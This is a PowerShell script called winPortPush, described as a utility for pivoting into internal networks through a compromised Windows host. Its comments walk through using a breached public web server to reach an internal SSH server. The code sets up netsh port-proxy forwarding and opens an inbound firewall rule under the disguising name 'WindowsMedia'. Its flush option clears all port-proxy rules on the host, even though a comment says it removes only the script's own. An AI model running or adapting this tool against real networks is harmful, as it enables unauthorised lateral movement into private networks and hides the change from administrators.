#Requires -RunAsAdministrator
#
# winPortPush is a utility used for pivoting into internal networks via a compromised Windows host.
# You MUST have administrator privileges to run this script. Additionally, the FLUSH function of this script
# removes ALL port proxy rules, so this script may be dangerous to run on systems that have preiously sustained
# port proxy rules. 
#
#
# You can find a Linux equivalent of this tool here: https://github.com/itskindred/PortPush
#
#
#
# Example:
#
# Supposed you have a compromised a public facing web server with the Public IP address of 134.20.100.4. This web server
# Also has a second interface, that is connected to a private corporate network in the subnet 192.168.1.0/24. In this internal
# Network, there exists a host with SSH open, and you have valid credentials to that SSH server. The Windows host you have compromised
# does not have an SSH client installed.
#
# Normally, you would not be able to communicate with the internal host, with an IP of lets say 192.168.1.200, because it is a private address.
# However, with winPortPush, you can.
#
# To access the internal host, winPortPush will act as a proxy between your attacking machine and the internal target. To do this, you would run
# the following command: 
# 
# winPortPush -lPort 22022 -listenIP "134.20.100.4" -tPort 22 -targetIP "192.168.1.200"
#
# Now, from your attacking machine, you would access the internal SSH server by sending your SSH connection to 134.20.100.4 on port 22022, which will
# then be forwarded to the internal host: ssh -p 22022 134.20.100.4
#


# Validates a port value.
function validatePort {
	param( [int]$Port )
	
	If ( [int]$Port -lt 1 -OR [int]$Port -gt 65535 ) {
		Write-Error -Message "Invalid Port Specified." -Category InvalidArgument -ErrorAction Stop
	}
}

# Validates an IP value.
function validateIP {
	param( [string]$IP )
	
	$error.clear()
	
	try { 
		[ipaddress]$IP | Out-Null 
	}
	
	catch {
		Write-Error -Message "Invalid IP Address Specified." -Category InvalidArgument -ErrorAction Stop
	}
}
	
# Deletes a specified rule from the port proxy ruleset
function deleteRule {
	param( [int]$lPort, [string]$listenIP )
	
	if ( ! $listenIP ) {
		Write-Error -Message "No Listen IP specified. A listening IP address must be specified when deleting a rule." -Category InvalidArgument -ErrorAction Stop
	}
	
	elseif ( ! $lPort ) {
		Write-Error -Message "No Listen Port specified. A listening port must be specified when deleting a rule." -Category InvalidArgument -ErrorAction Stop
	}
	
	else {
		validateIP -IP $listenIP
		validatePort -Port $lPort
		
		try {
			# Gets the associated rule from the firewall rule list.
			$rule = Get-NetFirewallRule -DisplayName WindowsMedia | Get-NetFirewallPortFilter | Where-Object LocalPort -eq $lPort | Select -ExpandProperty CreationClassName 
			$delrule = $rule.split("|")[3]
		}
		
		catch {
			Write-Error -Message "Unable to locate associated rule. Please verify your specified IP and Port." -Category InvalidArgument -ErrorAction Stop
		}
		
		netsh interface portproxy delete v4tov4 listenport=$lPort listenaddress=$listenIP
		Remove-NetFirewallRule -Name $delrule
		
		$socketString = $listenIP + ":" + $lPort
		Write-Host "$socketString rule has been successfully removed."
		Write-Host " "
	}
}

# Deletes ALL rules that have been created by the PortPush utility (ONLY rules made by PortPush)
function flushRules {
	param( [string]$listenIP )
	
	netsh interface portproxy reset v4tov4
	Write-Host "All Rules have been successfully flushed."
	Write-Host " "
	
}

# Adds a new PortPush rule.
function addRule {
	param( [int]$lPort, [int]$tPort, [string]$listenIP, [string]$targetIP )
	
	if ( ! $lPort ) {
		Write-Error -Message "No Listening Port specified. A listening port must be specified." -Category InvalidArgument -ErrorAction Stop
	}
	
	elseif ( ! $tPort ) {
		Write-Error -Message "No Target Port specified. A target port must be specified." -Category InvalidArgument -ErrorAction Stop
	}
	
	elseif ( ! $listenIP ) {
		Write-Error -Message "No Listening IP specified. A listening IP must be specified." -Category InvalidArgument -ErrorAction Stop
	}
	
	elseif ( ! $targetIP ) {
		Write-Error -Message "No Target IP specified. A target IP must be specified." -Category InvalidArgument -ErrorAction Stop
	}
	
	else {
		validatePort -Port $lPort
		validatePort -Port $tPort
		validateIP -IP $listenIP
		validateIP -IP $targetIP
		
		$error.clear()
		
		try {
			netsh advfirewall firewall add rule name=WindowsMedia dir=in protocol=TCP localport=$lPort action=allow | Out-Null
		}
		
		catch {
			Write-Error -Message "Unable to create firewall rule. Are you running as administrator?" -Category ProtocolError -ErrorAction Stop
		}
		
		try {
			netsh interface portproxy add v4tov4 listenport=$lPort listenaddress=$listenIP connectport=$tPort connectaddress=$targetIP
		}
		
		catch {
			Write-Error -Message "Unable to create forwarding rule. Are you running as administrator?" -Category ProtocolError -ErrorAction Stop
		}
		
		$listenSocket = $listenIP + ":" + $lPort
		$targetSocket = $targetIP + ":" + $tPort
		Write-Host " $listenSocket => $targetSocket rule has been added."
		Write-Host " "
	}
}

function listRules {
	netsh interface portproxy show v4tov4
}

function printHelp {
	Write-Host " "
	Write-Host "Usage: winPortPush -lPort *listening port* -listenIP `"*listening IP*`" -tPort *target port* -targetIP `"*target IP*`""
	Write-Host " "
	Write-Host "Meta Options: "
	Write-Host "----------------------"
	Write-Host "-Help	  | Display this help page."
	Write-Host "-List	  | List the currently configured rules."
	Write-Host "-Flush	  | Removes all configured port proxy rules."
	Write-Host "-Delete	  | Deletes a configured rule."
	Write-Host " "
	Write-Host "Adding Rule Options: "
	Write-Host "----------------------"
	Write-Host "-lPort	  | The listening port on the compromised host."
	Write-Host "-listenIP | The IP of the listening interface on the compromised host."
	Write-Host "-tPort	  | The internal port you want to communicate with."
	Write-Host "-targetIP | The IP address of the internal host you want to communicate with."
	Write-Host " "
	Write-Host "Example Usages:"
	Write-Host "----------------------"
	Write-Host "winPortPush -lPort 22022 -listenIP `"134.20.100.4`" -tPort 22 -targetIP `"192.168.1.200`""
	Write-Host "(To SSH into an internal host 192.168.1.200, you would instead SSH to port 22022 on 134.20.100.4.)"
	Write-Host " "
	Write-Host "winPortPush -Delete -lPort 22022 -listenIP `"134.20.100.4`""
	Write-Host "(Deletes the above rule.)"
	Write-Host " "
}

# This is the function users should be calling. Sub-functions can be called directly, but it is not encouraged.
function winPortPush {
	param( [switch]$help, [switch]$list, [switch]$flush, [switch]$delete, [int]$lPort, [int]$tPort, [string]$listenIP, [string]$targetIP )
	
	if ( $help ) {
		printHelp
	}
	
	elseif ( ! $help -AND ! $list -AND ! $flush -AND ! $delete -AND ( ! $lPort -OR ! $tPort -OR ! $listenIP -OR ! $targetIP ) ) {
		printhelp
	}
	
	elseif ( $list ) {
		listRules
	}
	
	elseif ( $flush ) {
		flushRules -listenIP $listenIP
	}
	
	elseif ( $delete ) {
		deleteRule -listenIP $listenIP -lPort $lPort
	}
	
	else {
		addRule -lPort $lPort -listenIP $listenIP -tPort $tPort -targetIP $targetIP
	}
}